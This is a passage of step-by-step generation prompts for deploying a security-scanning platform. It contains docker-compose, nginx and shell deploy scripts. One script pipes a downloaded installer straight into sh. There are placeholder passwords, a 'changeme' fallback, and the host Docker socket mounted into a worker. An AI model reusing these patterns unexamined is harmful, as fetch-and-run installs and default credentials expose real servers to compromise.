      --save 300 10
    volumes:
      - redis_data:/data
    healthcheck:
      test: ["CMD", "redis-cli",
             "-a", "${REDIS_PASSWORD}", "ping"]
      interval: 10s
      timeout: 3s
      retries: 5
    deploy:
      resources:
        limits:
          memory: 768M

  # ── FastAPI Backend ───────────────────────────────────
  backend:
    <<: *common-env
    build:
      context: .
      dockerfile: docker/Dockerfile.backend
    volumes:
      - scan_outputs:/app/scan_outputs
      - report_outputs:/app/reports/output
      - static_files:/app/static
    expose:
      - "8000"
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:8000/health"]
      interval: 30s
      timeout: 10s
      retries: 3
      start_period: 60s
    depends_on:
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: "2.0"
      replicas: 2
    logging:
      driver: "json-file"
      options:
        max-size: "50m"
        max-file: "10"

  # ── Celery Workers ─────────────────────────────────────
  worker_recon:
    <<: *worker-base
    command: celery -A backend.workers.celery_app worker
             --loglevel=info --queues=recon_queue
             --concurrency=4 --hostname=recon@%h
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: "2.0"

  worker_enum:
    <<: *worker-base
    command: celery -A backend.workers.celery_app worker
             --loglevel=info --queues=enum_queue
             --concurrency=3 --hostname=enum@%h
    deploy:
      resources:
        limits:
          memory: 2G
          cpus: "2.0"

  worker_vuln:
    <<: *worker-base
    command: celery -A backend.workers.celery_app worker
             --loglevel=info --queues=vuln_queue
             --concurrency=2 --hostname=vuln@%h
    deploy:
      resources:
        limits:
          memory: 3G
          cpus: "2.0"

  worker_secrets:
    <<: *worker-base
    command: celery -A backend.workers.celery_app worker
             --loglevel=info --queues=secrets_queue
             --concurrency=2 --hostname=secrets@%h
    deploy:
      resources:
        limits:
          memory: 1G

  worker_report:
    <<: *worker-base
    command: celery -A backend.workers.celery_app worker
             --loglevel=info --queues=report_queue
             --concurrency=1 --hostname=report@%h
    volumes:
      - scan_outputs:/app/scan_outputs
      - report_outputs:/app/reports/output
    deploy:
      resources:
        limits:
          memory: 2G

  worker_strix:
    <<: *common-env
    build:
      context: .
      dockerfile: docker/Dockerfile.strix
    command: celery -A backend.workers.celery_app worker
             --loglevel=info --queues=strix_queue
             --concurrency=1 --hostname=strix@%h
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - strix_runs:/app/strix_runs
    deploy:
      resources:
        limits:
          memory: 4G
          cpus: "2.0"

  # ── Celery Beat (scheduled tasks) ─────────────────────
  celery_beat:
    <<: *common-env
    build:
      context: .
      dockerfile: docker/Dockerfile.worker
    command: celery -A backend.workers.celery_app beat
             --loglevel=info
             --scheduler django_celery_beat.schedulers:DatabaseScheduler
    depends_on:
      postgres:
        condition: service_healthy
    deploy:
      resources:
        limits:
          memory: 256M

  # ── Flower (Celery Monitor) ────────────────────────────
  flower:
    <<: *common-env
    image: mher/flower:2.0
    command: >
      celery flower
      --broker=${CELERY_BROKER_URL}
      --port=5555
      --basic_auth=admin:${FLOWER_PASSWORD:-changeme}
    expose:
      - "5555"
    depends_on:
      redis:
        condition: service_healthy
    deploy:
      resources:
        limits:
          memory: 256M

  # ── DB Backup ─────────────────────────────────────────
  postgres_backup:
    image: prodrigestivill/postgres-backup-local:16
    restart: always
    volumes:
      - db_backups:/backups
    environment:
      POSTGRES_HOST: postgres
      POSTGRES_DB: ${POSTGRES_DB}
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
      SCHEDULE: "@daily"
      BACKUP_KEEP_DAYS: 7
      BACKUP_KEEP_WEEKS: 4
      BACKUP_KEEP_MONTHS: 3
    depends_on:
      postgres:
        condition: service_healthy
    networks:
      - agentsec_internal

# ── Networks ──────────────────────────────────────────────

networks:
  agentsec_internal:
    driver: bridge
    internal: true
  agentsec_external:
    driver: bridge

# ── Volumes ───────────────────────────────────────────────

volumes:
  postgres_data:
    driver: local
  redis_data:
    driver: local
  scan_outputs:
    driver: local
  report_outputs:
    driver: local
  static_files:
    driver: local
  db_backups:
    driver: local
  certbot_certs:
    driver: local
  certbot_webroot:
    driver: local
  strix_runs:
    driver: local

Generate docker-compose.prod.yml only. Stop after.
```

---

### Step 15.3 — Nginx Configuration

```
PHASE 15 — STEP 3

Generate:
  docker/nginx/nginx.prod.conf
  docker/nginx/conf.d/agentsec.conf

─────────────────────────────────────────

nginx.prod.conf:

user nginx;
worker_processes auto;
error_log /var/log/nginx/error.log warn;
pid /var/run/nginx.pid;

events {
  worker_connections 1024;
  use epoll;
  multi_accept on;
}

http {
  include /etc/nginx/mime.types;
  default_type application/octet-stream;

  # ── Logging ───────────────────────────────────────────
  log_format main
    '$remote_addr - $remote_user [$time_local] '
    '"$request" $status $body_bytes_sent '
    '"$http_referer" "$http_user_agent" '
    '$request_time';

  access_log /var/log/nginx/access.log main;

  # ── Performance ───────────────────────────────────────
  sendfile on;
  tcp_nopush on;
  tcp_nodelay on;
  keepalive_timeout 65;
  types_hash_max_size 2048;
  server_tokens off;
  client_max_body_size 50M;
  gzip on;
  gzip_types text/plain text/css application/json
    application/javascript text/xml application/xml
    image/svg+xml;
  gzip_min_length 1000;

  # ── Rate limiting zones ───────────────────────────────
  limit_req_zone $binary_remote_addr
    zone=api_general:10m rate=100r/m;
  limit_req_zone $binary_remote_addr
    zone=api_auth:10m rate=10r/m;
  limit_req_zone $binary_remote_addr
    zone=api_scan:10m rate=5r/m;

  include /etc/nginx/conf.d/*.conf;
}

─────────────────────────────────────────

docker/nginx/conf.d/agentsec.conf:

# ── Upstream backend servers ──────────────────────────

upstream backend {
  least_conn;
  server backend:8000 max_fails=3 fail_timeout=30s;
  keepalive 32;
}

upstream flower {
  server flower:5555;
}

# ── HTTP → HTTPS redirect ─────────────────────────────

server {
  listen 80;
  server_name ${DOMAIN} www.${DOMAIN};

  # Let's Encrypt validation path
  location /.well-known/acme-challenge/ {
    root /var/www/certbot;
  }

  location / {
    return 301 https://$host$request_uri;
  }
}

# ── Main HTTPS server ─────────────────────────────────

server {
  listen 443 ssl http2;
  server_name ${DOMAIN} www.${DOMAIN};

  # ── SSL ─────────────────────────────────────────────
  ssl_certificate /etc/letsencrypt/live/${DOMAIN}/fullchain.pem;
  ssl_certificate_key /etc/letsencrypt/live/${DOMAIN}/privkey.pem;
  ssl_session_timeout 1d;
  ssl_session_cache shared:SSL:50m;
  ssl_session_tickets off;
  ssl_protocols TLSv1.2 TLSv1.3;
  ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
  ssl_prefer_server_ciphers off;
  ssl_stapling on;
  ssl_stapling_verify on;

  # ── Security headers ─────────────────────────────────
  add_header Strict-Transport-Security
    "max-age=63072000; includeSubDomains; preload" always;
  add_header X-Frame-Options DENY always;
  add_header X-Content-Type-Options nosniff always;
  add_header X-XSS-Protection "1; mode=block" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Content-Security-Policy
    "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src 'self' fonts.gstatic.com; img-src 'self' data:; connect-src 'self' wss: ws:;" always;
  add_header Permissions-Policy
    "camera=(), microphone=(), geolocation=()" always;

  # ── Frontend static files ────────────────────────────
  location / {
    root /app/static;
    try_files $uri $uri/ /index.html;
    expires 1h;
    add_header Cache-Control "public, immutable";
  }

  location /assets/ {
    root /app/static;
    expires 1y;
    add_header Cache-Control "public, immutable";
  }

  # ── API ──────────────────────────────────────────────
  location /api/ {
    limit_req zone=api_general burst=20 nodelay;
    proxy_pass http://backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 300s;
    proxy_connect_timeout 10s;
    proxy_buffering off;
  }

  # Auth endpoints: stricter rate limit
  location /api/v1/auth/login {
    limit_req zone=api_auth burst=3 nodelay;
    proxy_pass http://backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }

  location /api/v1/auth/register {
    limit_req zone=api_auth burst=3 nodelay;
    proxy_pass http://backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }

  # Scan creation: even stricter
  location /api/v1/scans {
    limit_req zone=api_scan burst=2 nodelay;
    proxy_pass http://backend;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
    proxy_read_timeout 30s;
  }

  # ── WebSocket ────────────────────────────────────────
  location /ws/ {
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_read_timeout 3600s;
    proxy_send_timeout 3600s;
  }

  # ── Flower monitoring (restricted) ───────────────────
  location /flower/ {
    auth_basic "AgentSec Monitoring";
    auth_basic_user_file /etc/nginx/.htpasswd;
    proxy_pass http://flower/;
    proxy_set_header Host $host;
    rewrite ^/flower/(.*)$ /$1 break;
  }

  # ── Report downloads ─────────────────────────────────
  location /api/v1/reports/ {
    proxy_pass http://backend;
    proxy_set_header Host $host;
    proxy_read_timeout 120s;
    # Large PDF files
    proxy_buffering on;
    proxy_buffer_size 128k;
    proxy_buffers 4 256k;
  }
}

Generate both files. Stop after.
```

---

### Step 15.4 — Deploy Script

```
PHASE 15 — STEP 4

Generate:
  scripts/deploy.sh
  scripts/update.sh
  scripts/rollback.sh
  scripts/healthcheck.sh

─────────────────────────────────────────

scripts/deploy.sh:

#!/bin/bash
# AgentSec AI — First deploy script.
# Run once on a fresh Ubuntu 22.04 server.
# Usage: bash scripts/deploy.sh

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log()    { echo -e "${GREEN}[AgentSec]${NC} $1"; }
warn()   { echo -e "${YELLOW}[WARNING]${NC}  $1"; }
error()  { echo -e "${RED}[ERROR]${NC}    $1"; exit 1; }

# ── Preflight ─────────────────────────────────────────

log "Starting AgentSec AI deployment..."

[[ $EUID -ne 0 ]] && error "Run as root: sudo bash scripts/deploy.sh"

[[ ! -f .env.production ]] && error \
  ".env.production not found. Copy .env.production.example and fill in values."

source .env.production

[[ -z "${SECRET_KEY:-}" ]] && error "SECRET_KEY is empty in .env.production"
[[ -z "${JWT_SECRET_KEY:-}" ]] && error "JWT_SECRET_KEY is empty"
[[ -z "${POSTGRES_PASSWORD:-}" ]] && error "POSTGRES_PASSWORD is empty"
[[ -z "${DOMAIN:-}" ]] && error "DOMAIN is empty"

# ── Install Docker ────────────────────────────────────

if ! command -v docker &>/dev/null; then
  log "Installing Docker..."
  curl -fsSL https://get.docker.com | sh
  systemctl enable docker
  systemctl start docker
  log "Docker installed."
else
  log "Docker already installed: $(docker --version)"
fi

if ! docker compose version &>/dev/null; then
  error "Docker Compose v2 not found."
fi

# ── Frontend build ────────────────────────────────────

log "Building frontend..."
cd frontend
npm ci --production=false
npm run build
cd ..
mkdir -p docker/static
cp -r frontend/dist/* docker/static/
log "Frontend built."

# ── Pull images + build ───────────────────────────────

log "Building Docker images..."
docker compose -f docker-compose.prod.yml build --no-cache
log "Images built."

# ── Start services ────────────────────────────────────

log "Starting services..."
docker compose -f docker-compose.prod.yml up -d \
  postgres redis

log "Waiting for database..."
sleep 20

log "Running Alembic migrations..."
docker compose -f docker-compose.prod.yml run --rm \
  backend alembic upgrade head

log "Starting all services..."
docker compose -f docker-compose.prod.yml up -d

log "Waiting for services to be healthy..."
sleep 30

# ── SSL setup ─────────────────────────────────────────

if [[ "${SSL_EMAIL:-}" != "" ]]; then
  log "Requesting SSL certificate for ${DOMAIN}..."
  
  # First: start nginx without SSL for certbot validation
  docker compose -f docker-compose.prod.yml run --rm \
    certbot certonly --webroot \
    --webroot-path=/var/www/certbot \
    --email "${SSL_EMAIL}" \
    --agree-tos --no-eff-email \
    -d "${DOMAIN}" -d "www.${DOMAIN}"
  
  # Reload nginx with SSL
  docker compose -f docker-compose.prod.yml exec \
    nginx nginx -s reload
  
  log "SSL certificate obtained."
fi

# ── Health check ──────────────────────────────────────

log "Running health check..."
bash scripts/healthcheck.sh

log ""
log "══════════════════════════════════════════"
log "  AgentSec AI deployed successfully!"
log "  URL: https://${DOMAIN}"
log "  API: https://${DOMAIN}/api/docs"
log "  Flower: https://${DOMAIN}/flower/"
log "══════════════════════════════════════════"

─────────────────────────────────────────

scripts/update.sh:

#!/bin/bash
# Zero-downtime update procedure.
# Usage: bash scripts/update.sh

set -euo pipefail

GREEN='\033[0;32m'
NC='\033[0m'

log() { echo -e "${GREEN}[AgentSec Update]${NC} $1"; }

log "Starting update..."

# Tag current images as previous (for rollback)
docker tag agentsec-backend:latest \
  agentsec-backend:previous 2>/dev/null || true
docker tag agentsec-worker:latest \
  agentsec-worker:previous 2>/dev/null || true

# Pull latest code
git pull origin main

# Build new frontend
log "Building frontend..."
cd frontend && npm ci && npm run build && cd ..
cp -r frontend/dist/* docker/static/

# Build new images
log "Building backend images..."
docker compose -f docker-compose.prod.yml build \
  backend worker_recon worker_enum worker_vuln \
  worker_secrets worker_report

# Run migrations
log "Running migrations..."
docker compose -f docker-compose.prod.yml run --rm \
  backend alembic upgrade head

# Rolling restart (backend first, then workers)
log "Restarting backend..."
docker compose -f docker-compose.prod.yml up -d \
  --no-deps --build backend

log "Waiting for backend health..."
sleep 20

log "Restarting workers..."
docker compose -f docker-compose.prod.yml up -d \
  --no-deps worker_recon worker_enum worker_vuln \
  worker_secrets worker_report

# Verify
bash scripts/healthcheck.sh

log "Update complete."

─────────────────────────────────────────

scripts/rollback.sh:

#!/bin/bash
# Rollback to previous image version.
# Usage: bash scripts/rollback.sh

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

log()   { echo -e "${GREEN}[AgentSec Rollback]${NC} $1"; }
error() { echo -e "${RED}[ERROR]${NC} $1"; exit 1; }

log "⚠️  Rolling back to previous version..."

# Check previous images exist
docker image inspect agentsec-backend:previous \
  &>/dev/null || error "No previous image found."

# Restore previous tags
docker tag agentsec-backend:previous \
  agentsec-backend:latest
docker tag agentsec-worker:previous \
  agentsec-worker:latest

# Rollback database migration
log "Rolling back last migration..."
docker compose -f docker-compose.prod.yml run --rm \
  backend alembic downgrade -1

# Restart with previous images
docker compose -f docker-compose.prod.yml up -d \
  --no-deps backend worker_recon worker_enum \
  worker_vuln worker_secrets worker_report

sleep 20
bash scripts/healthcheck.sh

log "Rollback complete."

─────────────────────────────────────────

scripts/healthcheck.sh:

#!/bin/bash
# Verify all services are running correctly.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

pass() { echo -e "${GREEN}✓${NC}  $1"; }
fail() { echo -e "${RED}✗${NC}  $1"; FAILED=1; }

FAILED=0
source .env.production 2>/dev/null || true

# ── Service health ────────────────────────────────────

echo "Checking AgentSec AI services..."

# Postgres
docker compose -f docker-compose.prod.yml exec \
  -T postgres pg_isready -U "${POSTGRES_USER:-agentsec}" \
  &>/dev/null && pass "PostgreSQL" || fail "PostgreSQL"

# Redis
docker compose -f docker-compose.prod.yml exec \
  -T redis redis-cli \
  -a "${REDIS_PASSWORD:-}" ping \
  2>/dev/null | grep -q PONG \
  && pass "Redis" || fail "Redis"

# Backend API
STATUS=$(curl -sf http://localhost:8000/health \
  -o /dev/null -w "%{http_code}" 2>/dev/null || echo 0)
[[ "$STATUS" == "200" ]] && pass "Backend API" \
  || fail "Backend API (status: $STATUS)"

# Workers
for worker in recon enum vuln secrets report; do
  RUNNING=$(docker compose -f docker-compose.prod.yml \
    ps worker_${worker} 2>/dev/null \
    | grep -c "Up" || echo 0)
  [[ "$RUNNING" -ge 1 ]] && pass "Worker: ${worker}" \
    || fail "Worker: ${worker}"
done

# Nginx
STATUS=$(curl -sk https://localhost/ \
  -o /dev/null -w "%{http_code}" 2>/dev/null || echo 0)
[[ "$STATUS" =~ ^(200|301|302|404)$ ]] \
  && pass "Nginx" || fail "Nginx (status: $STATUS)"

# ── Summary ───────────────────────────────────────────

echo ""
if [[ "$FAILED" -eq 0 ]]; then
  echo -e "${GREEN}All checks passed.${NC}"
  exit 0
else
  echo -e "${RED}Some checks failed. Review the output above.${NC}"
  exit 1
fi

Generate all 4 files. Stop after.
```

---

### Step 15.5 — SSL Renewal + Monitoring

```
PHASE 15 — STEP 5

Generate:
  scripts/renew_ssl.sh
  docker/postgres/init.sql
  scripts/logs.sh

─────────────────────────────────────────

scripts/renew_ssl.sh:

#!/bin/bash
# Renew Let's Encrypt SSL certificates.
# Add to cron: 0 0 1 * * /path/to/scripts/renew_ssl.sh

set -euo pipefail

cd "$(dirname "$0")/.."

docker compose -f docker-compose.prod.yml run --rm \
  certbot renew --quiet

docker compose -f docker-compose.prod.yml exec \
  nginx nginx -s reload

echo "SSL renewed: $(date)"

─────────────────────────────────────────

docker/postgres/init.sql:

-- AgentSec AI PostgreSQL initialization
-- Runs once on first container start

-- Enable required extensions
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";
CREATE EXTENSION IF NOT EXISTS "pg_trgm";

-- Performance settings
ALTER SYSTEM SET shared_preload_libraries = 'pg_stat_statements';
ALTER SYSTEM SET max_connections = 200;
ALTER SYSTEM SET work_mem = '16MB';
ALTER SYSTEM SET maintenance_work_mem = '256MB';
ALTER SYSTEM SET checkpoint_completion_target = 0.9;
ALTER SYSTEM SET wal_buffers = '16MB';
ALTER SYSTEM SET effective_cache_size = '4GB';

-- Create read-only user for monitoring/analytics
DO $$
BEGIN
  IF NOT EXISTS (
    SELECT FROM pg_catalog.pg_roles WHERE rolname = 'agentsec_ro'
  ) THEN
    CREATE ROLE agentsec_ro WITH LOGIN
      PASSWORD 'CHANGE_ME_IN_PRODUCTION'
      NOSUPERUSER NOCREATEDB NOCREATEROLE;
  END IF;
END $$;

GRANT CONNECT ON DATABASE agentsecdb TO agentsec_ro;
GRANT USAGE ON SCHEMA public TO agentsec_ro;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO agentsec_ro;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT SELECT ON TABLES TO agentsec_ro;

─────────────────────────────────────────

scripts/logs.sh:

#!/bin/bash
# Stream logs from all services.
# Usage: bash scripts/logs.sh [service_name]
# Example: bash scripts/logs.sh backend

SERVICE=${1:-""}

if [[ -n "$SERVICE" ]]; then
  docker compose -f docker-compose.prod.yml \
    logs -f --tail=100 "$SERVICE"
else
  docker compose -f docker-compose.prod.yml \
    logs -f --tail=50
fi

Generate all 3 files. Stop after.
```

---

### Step 15.6 — Production Makefile

```
PHASE 15 — STEP 6

Generate: Makefile additions (append to existing Makefile)

─────────────────────────────────────────

# ── Production deployment ──────────────────────────────

deploy:
	@echo "Deploying AgentSec AI to production..."
	bash scripts/deploy.sh

update:
	@echo "Updating AgentSec AI..."
	bash scripts/update.sh

rollback:
	@echo "Rolling back..."
	bash scripts/rollback.sh

health:
	bash scripts/healthcheck.sh

ssl-renew:
	bash scripts/renew_ssl.sh

logs:
	bash scripts/logs.sh

logs-backend:
	bash scripts/logs.sh backend

logs-workers:
	docker compose -f docker-compose.prod.yml logs -f \
		worker_recon worker_enum worker_vuln \
		worker_secrets worker_report

# ── Production management ─────────────────────────────

prod-shell:
	docker compose -f docker-compose.prod.yml \
		exec backend bash

prod-db:
	docker compose -f docker-compose.prod.yml \
		exec postgres psql -U $${POSTGRES_USER} $${POSTGRES_DB}

prod-stop:
	docker compose -f docker-compose.prod.yml down

prod-restart:
	docker compose -f docker-compose.prod.yml restart

prod-status:
	docker compose -f docker-compose.prod.yml ps

# ── Backup / Restore ──────────────────────────────────

backup:
	docker compose -f docker-compose.prod.yml \
		exec postgres_backup /backup.sh

restore:
	@echo "Usage: BACKUP_FILE=backup.sql.gz make restore-db"
	docker compose -f docker-compose.prod.yml run --rm \
		postgres psql -U $${POSTGRES_USER} $${POSTGRES_DB} \
		< $${BACKUP_FILE}

# ── Secrets ───────────────────────────────────────────

generate-secrets:
	bash scripts/generate_secrets.sh

Generate Makefile additions. Stop after.
```

---

### Step 15.7 — Final Verification

```
PHASE 15 — STEP 7 — FINAL VERIFICATION

─────────────────────────────────────────

PRE-DEPLOY CHECKLIST:

□ Ubuntu 22.04 LTS server ready
□ DNS A records pointing to server IP
    yourdomain.com → server IP
    www.yourdomain.com → server IP
□ Ports 80 and 443 open in firewall
□ .env.production filled in completely
□ generate_secrets.sh run, all secrets set
□ ANTHROPIC_API_KEY has credits
□ git clone complete on server

─────────────────────────────────────────

STEP 1: Generate secrets

  bash scripts/generate_secrets.sh
  
  Copy output into .env.production.
  
  Verify:
    SECRET_KEY is 64+ chars
    JWT_SECRET_KEY is 64+ chars
    POSTGRES_PASSWORD is set
    REDIS_PASSWORD is set

─────────────────────────────────────────

STEP 2: Run deploy script

  sudo bash scripts/deploy.sh
  
  Watch for these SUCCESS lines:
    ✓ Docker installed
    ✓ Frontend built
    ✓ Images built
    ✓ Migrations applied
    ✓ SSL certificate obtained
    ✓ All services running

─────────────────────────────────────────

STEP 3: Health check

  bash scripts/healthcheck.sh
  
  Expected output:
    ✓  PostgreSQL
    ✓  Redis
    ✓  Backend API
    ✓  Worker: recon
    ✓  Worker: enum
    ✓  Worker: vuln
    ✓  Worker: secrets
    ✓  Worker: report
    ✓  Nginx
    
    All checks passed.

─────────────────────────────────────────

STEP 4: Browser verification

  Open https://yourdomain.com
  
  □ Site loads (no SSL warning)
  □ HSTS header present
  □ Login page renders correctly
  □ 3D element on login page visible
  □ Can register an account
  □ Can log in
  □ Dashboard loads with stat cards
  □ "New Scan" button opens scan input
  
  Open https://yourdomain.com/api/docs
  □ Swagger UI loads
  □ All 40+ endpoints visible

─────────────────────────────────────────

STEP 5: First production scan

  In the dashboard:
  1. Register an admin account
  2. Create scan: target = scanme.nmap.org
  3. Watch Live Progress Dashboard
  4. Wait for completion
  5. Download PDF report
  
  Expected: PDF generates with findings.
  scanme.nmap.org is a legal target.

─────────────────────────────────────────

STEP 6: Notification test

  In Settings → Notifications:
  1. Configure Telegram or Slack webhook
  2. Click "Test" button
  3. Verify notification received

─────────────────────────────────────────

STEP 7: SSL verification

  ssl-checker.online or:
    curl -vI https://yourdomain.com 2>&1 \
      | grep -E "SSL|TLS|subject|issuer|expire"
  
  Verify:
    TLS 1.2 and 1.3 supported
    TLS 1.0 and 1.1 NOT supported
    Certificate not expired
    HSTS header present

─────────────────────────────────────────

STEP 8: Flower monitoring

  Open https://yourdomain.com/flower/
  
  □ Login with admin credentials
  □ All workers online (green)
  □ All queues visible
  □ Task history loads

─────────────────────────────────────────

STEP 9: SSL auto-renewal cron

  Add to crontab (root):
    crontab -e
    0 0 1 * * /path/to/agentsec-ai/scripts/renew_ssl.sh
    >> /var/log/ssl_renew.log 2>&1

─────────────────────────────────────────

STEP 10: Update test

  After confirming all above:
  bash scripts/update.sh
  
  Verify zero downtime:
    Site remains accessible during update
    No 502 errors during backend restart

─────────────────────────────────────────

Phase 15 complete when:
  □ All health checks pass
  □ SSL grade A on ssllabs.com/ssltest/
  □ Production scan completes on scanme.nmap.org
  □ PDF report downloads correctly
  □ Notification delivers
  □ Flower shows all workers healthy
  □ SSL renewal cron configured
  □ Backup container running (check: make prod-status)
```

---

## Complete Phase Map — All 16 Phases

| Phase | Name | Status |
|---|---|---|
| 0 | Environment Setup | ✅ Prompted |
| 1 | Core Data Models | ✅ Prompted |
| 2 | Orchestrator + Event Bus | ✅ Prompted |
| 3 | Plugin Manager | ✅ Prompted |
| 4 | Recon Agent | ✅ Prompted |
| 5 | Enumeration Agent | ✅ Prompted |
| 6 | Vulnerability Agent | ✅ Prompted |
| 7 | Secret & Cloud Agent | ✅ Prompted |
| 8 | Exploitation Agent | ✅ Prompted |
| 9 | Reporting Agent | ✅ Prompted |
| 10 | REST API | ✅ Prompted |
| 11 | Strix Integration | ✅ Prompted |
| 12 | Unified Scan Modes | ✅ Prompted |
| 13 | Premium Design System | ✅ Prompted |
| 14 | Testing + QA | ✅ Prompted |
| 15 | Dockerize + Deploy | ✅ Prompted |

**All phases complete. Start Phase 0 and work forward. Never skip. Never test mid-phase.**